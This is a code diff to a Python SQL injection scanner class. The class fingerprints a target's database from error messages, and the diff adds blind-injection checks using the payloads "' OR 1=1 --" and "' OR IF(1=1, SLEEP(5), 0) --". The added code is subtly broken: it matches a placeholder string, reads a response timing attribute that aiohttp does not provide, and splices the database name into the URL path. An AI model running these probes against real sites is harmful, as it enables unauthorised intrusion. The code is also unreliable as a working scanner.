@@ -3,9 +3,11 @@ from bs4 import BeautifulSoup as BS
 
 class SQLInjectionScanner:
 
-    def __init__(self, target_url, database_type):
+    detected_db_type = None
+
+    def __init__(self, target_url, database_types):
         self.target_url = target_url
-        self.database_type = database_type
+        self.database_types = database_types
         self.session = aiohttp.ClientSession()
         self.db_dict = {
             "MySQL": ['MySQL', 'MySQL Query fail:', 'SQL syntax', 'You have an error in your SQL syntax', 'mssql_query()', 'mssql_num_rows()', '1064 You have an error in your SQL syntax'],
@@ -15,33 +17,83 @@ class SQLInjectionScanner:
             "Advantage_Database": ['AdsCommandException', 'AdsConnectionException', 'AdsException', 'AdsExtendedReader', 'AdsDataReader', 'AdsError'],
             "Firebird": ['Dynamic SQL Error', 'SQL error code', 'arithmetic exception', 'numeric value is out of range', 'malformed string', 'Invalid token']
         }
-        self.db_type = None
+        self.detected_db_type = None
         self.db_name = None
         self.current_user = None
 
+    async def detect_database_type(self, response_data):
+        for db, identifiers in self.db_dict.items():
+            for dbid in identifiers:
+                if dbid in response_data:
+                    return db
+        return None
+
+    async def boolean_based_detection(self, database_type):
+        payload = f"{database_type}' OR 1=1 --"
+        url = f"{self.target_url}/{payload}"
+
+        async with self.session.get(url) as response:
+            data = await response.text()
+
+            if "some_unique_string_or_pattern" in data:
+                print("Boolean-Based Blind SQL Injection Detected!")
+                return True
+
+        return False
+
+    async def time_based_detection(self, database_type):
+        payload = f"{database_type}' OR IF(1=1, SLEEP(5), 0) --"
+        url = f"{self.target_url}/{payload}"
+
+        try:
+            async with self.session.get(url) as response:
+                elapsed_time = response.elapsed.total_seconds()
+                if elapsed_time > 5:  
+                    print("Time-Based Blind SQL Injection Detected!")
+                    return True
+
+        except aiohttp.ClientError as e:
+            print('Error during time-based detection: ', e)
+
+        return False
+
+    async def scan_blind_sql_injection(self, database_type):
+        boolean_injection_detected = await self.boolean_based_detection(database_type)
+
+        time_injection_detected = await self.time_based_detection(database_type)
+
+        return boolean_injection_detected or time_injection_detected
+
     async def scan_database_type(self):
-        urls = [self.database_type + "'", self.database_type + '"', self.database_type + ';', self.database_type + ")", self.database_type + "')", self.database_type + '")', self.database_type + '*', self.database_type + '";']
-        db_found = False
-        db_type = ''
+        db_type = None
 
         async with aiohttp.ClientSession() as session:
-            for url in urls:
-                try:
-                    async with session.get(url) as response:
-                        data = await response.text()
+            for database_type in self.database_types:
+                for suffix in ["'", '"', ';', ")", "')", '")', '*', '";']:
+                    url = f"{self.target_url}/{database_type}{suffix}"
 
-                        if not db_found:
-                            for db, identifiers in self.db_dict.items():
-                                for dbid in identifiers:
-                                    if dbid in data:
-                                        db_type = db
-                                        db_found = True
-                                        print(f"Database type: {db_type}")
-                                        break
-                except Exception as e:
-                    print('Error: ', e)
-                    print('Database type: Unknown')
+                    try:
+                        async with session.get(url) as response:
+                            data = await response.text()
+
+                            db_type = await self.detect_database_type(data)
+                            if db_type:
+                                print(f"Database type: {db_type}")
+                                break
+
+                    except Exception as e:
+                        print('Error: ', e)
+                        print('Database type: Unknown')
+                        break
+
+                if db_type:
                     break
+
+        if db_type:
+            injection_detected = await self.scan_blind_sql_injection(db_type)
+            if injection_detected:
+                self.detected_db_type = db_type
+
         return db_type
     
     async def get_version(self):
